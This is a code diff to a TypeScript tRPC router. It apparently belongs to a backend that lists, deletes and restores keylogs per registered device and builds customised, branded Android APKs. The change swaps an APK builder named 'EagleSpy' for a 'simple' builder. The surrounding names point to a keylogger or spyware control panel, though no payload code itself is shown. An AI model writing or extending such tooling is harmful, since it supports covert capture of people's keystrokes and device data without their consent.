@@ -11,7 +11,7 @@ import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildMemoryAPK } from "./apk-builder-memory";
-import { buildEagleSpyAPK } from "./apk-builder-eaglespy";
+import { buildSimpleAPK } from "./apk-builder-simple";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -141,8 +141,8 @@ export const appRouter = router({
           console.log('[ROUTER] Request origin detected:', requestOrigin);
           console.log('[ROUTER] VITE_APP_DOMAIN env:', process.env.VITE_APP_DOMAIN);
           
-          // Use EAGLESPY builder - real customization with template
-          const result = await buildEagleSpyAPK({
+          // Use SIMPLE builder - fast and reliable
+          const result = await buildSimpleAPK({
             appName: input.companyName,
             appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
